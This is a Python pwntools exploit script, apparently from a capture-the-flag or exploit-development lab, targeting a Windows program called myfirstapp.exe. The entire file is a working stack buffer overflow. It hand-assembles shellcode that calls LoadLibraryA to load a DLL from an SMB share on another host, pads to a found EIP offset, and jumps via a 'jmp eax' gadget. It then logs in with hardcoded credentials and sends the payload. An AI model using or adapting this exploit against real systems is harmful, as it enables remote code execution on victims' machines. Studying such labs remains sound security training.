#!/usr/bin/python3
from pwn import remote, log, sys, p32, asm

if len(sys.argv) != 2:
    log.failure(f"Usage: python3 {sys.argv[0]} <port>")
    sys.exit(1)

"""
HMODULE LoadLibraryA(
  [in] LPCSTR lpLibFileName
);
"""

# msfvenom -p windows/exec CMD=calc.exe -f dll -o shell.dll
smb = b"\\\\192.168.233.128\\kali\\shell.dll"[::-1].hex()

dll  = b""
dll += asm("sub esp, 0x64")                   # sub esp to avoid overwriting
dll += asm("xor ebx, ebx")                    # convert $ebx to 0x0
dll += asm("push ebx")                        # push string terminator (\x00)

for i in range(0, len(smb), 8):
     dll += asm("push 0x" + smb[i:8+i])       # push the smb string in dwords to $esp

dll += asm("mov ebx, esp")                    # save the smb string in $ebx
dll += asm("push ebx")                        # push ptr to the string
dll += asm("mov eax, dword ptr [0x719081c8]") # save LoadLibraryA() in $eax
dll += asm("call eax")                        # call $eax with the smb string as argument

# !py mona pattern_offset eip
offset = 66
junk = b"A" * (offset - len(dll))

# !py mona jmp -r eax -m myfirstapp.exe
jmpeax = p32(0x719023b3)

payload = dll + junk + jmpeax

shell = remote("Windows", sys.argv[1])

shell.sendlineafter(b"Username: ", b"alfiansyah")
shell.sendlineafter(b"Password: ", b"K3r4j@@nM4j@pAh!T")
shell.sendlineafter(b"FullName: ", b"Vickry Alfiansyah")
shell.sendlineafter(b"Input Your Code: ", payload)
